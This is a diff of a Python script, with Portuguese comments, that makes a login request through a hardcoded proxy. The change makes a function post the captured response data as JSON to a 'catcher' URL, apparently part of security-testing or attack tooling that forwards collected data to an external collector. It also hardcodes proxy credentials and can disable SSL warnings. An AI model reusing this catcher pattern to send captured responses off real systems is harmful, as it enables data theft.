@@ -25,9 +25,11 @@ def send_login_request():
     }
 
     try:
+        # A requisição de login está usando GET, mantido como no original.
         response = requests.get(
             url,
             headers=post_headers,
+            # ATENÇÃO: Proxy hardcoded com credenciais de placeholder (changeme) - Mudar!
             proxies={"http": "http://changeme:changeme@127.0.0.1:1234"},
             timeout=5,
         )
@@ -37,18 +39,25 @@ def send_login_request():
         return None, None
 
 def send_data_to_catcher(data, use_ssl):
+    """Envia os resultados para o Catcher URL usando POST e JSON."""
     if not use_ssl:
+        # ATENÇÃO: Desabilitar avisos de SSL (InsecureRequestWarning) é um risco de segurança.
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
     try:
-        response = requests.get(catcher_URL, timeout=3, verify=use_ssl)
-        print("[+] Data sent to the catcher.")
-    except requests.RequestException:
-        print(f"[-] Failed to send data to the catcher.")
+        # CORREÇÃO: Usando requests.post e enviando os dados como JSON
+        response = requests.post(catcher_URL, json=data, timeout=3, verify=use_ssl)
+        response.raise_for_status() # Lança exceção para códigos de erro HTTP
+        print(f"[+] Data sent to the catcher. Status: {response.status_code}")
+    except requests.RequestException as e:
+        print(f"[-] Failed to send data to the catcher. Error: {e}")
         
 # Initialize an empty list to store results
 results = []
 
-# Iterate over each username and perform login request
+# CORREÇÃO: Inicializa o dicionário 'result' antes de usá-lo
+result = {}
+
+# Perform the login request
 login_response_code, login_response = send_login_request()
 if login_response_code is not None and login_response is not None:
     result["status_code"] = login_response_code
